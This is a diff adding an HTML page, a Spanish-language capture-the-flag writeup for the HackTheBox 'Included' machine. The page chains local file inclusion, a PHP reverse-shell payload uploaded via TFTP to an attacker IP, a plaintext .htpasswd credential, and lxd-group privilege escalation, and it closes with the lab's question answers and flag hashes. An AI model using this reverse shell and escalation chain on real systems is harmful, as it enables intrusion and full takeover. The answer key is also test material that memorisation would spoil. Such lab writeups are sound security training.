@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Included HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/included.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Included HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Included de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Included de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Included HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Included HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Included de la plataforma de HackTheBox","headline":"Writeup Included HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Included HackTheBox</h1>
+          <p>Resolución de la máquina Included de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.147.93
+Nmap scan report for 10.129.147.93
+PORT   STATE SERVICE
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Al abrir la web podemos ver que gestiona la pagina mediante el parametro file= y el .php</p></div>
+<a href="./1.png" target="_blank"><div><p><img src="./1.png"><p></div></a>
+
+<div><p>Esto parece un Local File Inclusion podemos intentar leer el /etc/passwd y podemos verlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s </span><span class="no">"http://10.129.147.93/?file=/etc/passwd"</span><span class="p"> | </span><span class="s2">grep</span><span class="p"> sh$
+root:x:0:0:root:/root:/bin/bash
+mike:x:1000:1000:mike:/home/mike:/bin/bash</span>
+</code></pre></div></div>
+
+<div><p>Dejando esto de lado con un escaneo UDP podemos ver el 69 abierto que es tftp</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo nmap</span><span class="p"> -sU -T5 10.129.147.93
+Nmap scan report for 10.129.147.93
+PORT   STATE         SERVICE
+69/udp open|filtered tftp</span>
+</code></pre></div></div>
+
+<div><p>Podemos crear un archivo shell.php con una reverse shell y subirlo con put en tftp</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    </span><span class="k">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span><span class="p">)
+?></span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ tftp </span><span class="p">10.129.147.93
+</span><span class="kd">tftp></span><span class="p"> put shell.php
+Sent 77 bytes in 0.1 seconds
+</span><span class="kd">tftp></span>
+</code></pre></div></div>
+
+<div><p>Lo ha subido, para saber donde podemos ver en donde se encuentra el home de tftp</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s </span><span class="no">"http://10.129.147.93/?file=/etc/passwd"</span><span class="p"> | </span><span class="s2">grep</span><span class="p"> tftp
+tftp:x:110:113:tftp daemon,,,:</span><span class="kd">/var/lib/tftpboot</span><span class="p">:/usr/sbin/nologin</span>
+</code></pre></div></div>
+
+<div><p>Podemos llamar al shell.php en esa ruta y obtenemos una reverse shell como www-data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s </span><span class="no">"http://10.129.147.93/?file=/var/lib/tftpboot/shell.php"</span><span class="p">
+</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.147.93
+</span><span class="s2">www-data@included</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@included</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ hostname -I
+10.129.147.93 dead:beef::250:56ff:feb9:5778 
+</span><span class="s2">www-data@included</span><span class="p">:</span><span class="na">~/html</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ya dentro de la máquina podemos ver un archivo .htpasswd con credenciales en texto claro</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@included</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ ls -la
+drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
+drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
+-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
+-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
+-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
+drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
+-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
+-rw-r--r-- 1 www-data www-data  3704 Oct 13  2021 home.php
+drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
+-rw-r--r-- 1 www-data www-data   145 Oct 13  2021 index.php
+-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
+</span><span class="s2">www-data@included</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ cat .htpasswd
+mike:Sheffield19
+</span><span class="s2">www-data@included</span><span class="p">:</span><span class="na">~/html</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Usando las credenciales nos convertimos en mike, que por cierto esta en el grupo lxd</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@included</span><span class="p">:</span><span class="na">~/html</span><span class="p">$ su mike
+Password: </span><span class="kd">Sheffield19</span><span class="p">
+</span><span class="s2">mike@included</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
+</span><span class="s2">mike@included</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.129.147.93 dead:beef::250:56ff:feb9:5778 
+</span><span class="s2">mike@included</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat ~/user.txt 
+a56ef91d70cfbf2cdb8f454c006935a1
+</span><span class="s2">mike@included</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar un <a href="https://www.exploit-db.com/exploits/46978">exploit</a> con una imagen de alpine para conseguir una shell en un contenedor</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">mike@included</span><span class="p">:</span><span class="na">~</span><span class="p">$ bash exploit.sh -f alpine.tar.gz 
+Image imported with fingerprint: 6660ba8332f9a5637afe2e6713f1e257163aa6c7ae3c8
+[*] Listing images...
+
++--------+--------------+--------+--------------+--------+--------+
+| ALIAS  | FINGERPRINT  | PUBLIC | DESCRIPTION  |  ARCH  |  SIZE  |
++--------+--------------+--------+--------------+--------+--------+
+| alpine | 6660ba8332f9 | no     | alpine v3.14 | x86_64 | 3.10MB |
++--------+--------------+--------+--------------+--------+--------+
+Creating privesc
+Device giveMeRoot added to privesc
+</span><span class="kd">~ #</span><span class="p"> id
+uid=0(root) gid=0(root)
+</span><span class="kd">~ #</span>
+</code></pre></div></div>
+
+<div><p>Somos root y la raiz esta montada en /mnt/root asi que podemos leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">/mnt/root/root # </span><span class="p">cat root.txt 
+c693d9c7499d9f572ee375d4c14c7bcf
+</span><span class="kd">/mnt/root/root #</span>
+</code></pre></div></div>
+
+<div><p>Seguimos en un contenedor asi que hacemos suid la bash real salimos y la ejecutamos con -p</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">~ #</span><span class="p"> chmod u+s /mnt/root/bin/bash
+</span><span class="kd">~ #</span><span class="p"> exit
+
+[*] Removing container... [√]
+
+</span><span class="s2">mike@included</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1113504 Jun  6  2019 </span><span class="kd">/bin/bash
+</span><span class="s2">mike@included</span><span class="p">:</span><span class="na">~</span><span class="p">$ bash -p
+</span><span class="kd">bash-4.4#</span><span class="p"> whoami
+root
+</span><span class="kd">bash-4.4#</span><span class="p"> hostname -I
+10.129.147.93 dead:beef::250:56ff:feb9:5778 
+</span><span class="kd">bash-4.4#</span><span class="p"> cat /root/root.txt 
+c693d9c7499d9f572ee375d4c14c7bcf
+</span><span class="kd">bash-4.4#</span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>What service is running on the target machine over UDP?</strong></li>
+<ul><p></p><li>tftp</li></ul></blockquote><br>
+
+<blockquote><li><strong>What class of vulnerability is the webpage that is hosted on port 80 vulnerable to?</strong></li>
+<ul><p></p><li>Local File Inclusion</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the default system folder that TFTP uses to store files?</strong></li>
+<ul><p></p><li>/var/lib/tftpboot/</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which interesting file is located in the web server folder and can be used for Lateral Movement?</strong></li>
+<ul><p></p><li>.htpasswd</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the group that user Mike is a part of and can be exploited for Privilege Escalation?</strong></li>
+<ul><p></p><li>lxd</li></ul></blockquote><br>
+
+<blockquote><li><strong>When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?</strong></li>
+<ul><p></p><li>alpine</li></ul></blockquote><br>
+
+<blockquote><li><strong>What flag do we set to the container so that it has root privileges on the host system?</strong></li>
+<ul><p></p><li>security.privileged=true</li></ul></blockquote><br>
+
+<blockquote><li><strong>If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?</strong></li>
+<ul><p></p><li>/mnt/root/</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit user flag</strong></li>
+<ul><p></p><li>a56ef91d70cfbf2cdb8f454c006935a1</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>c693d9c7499d9f572ee375d4c14c7bcf</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
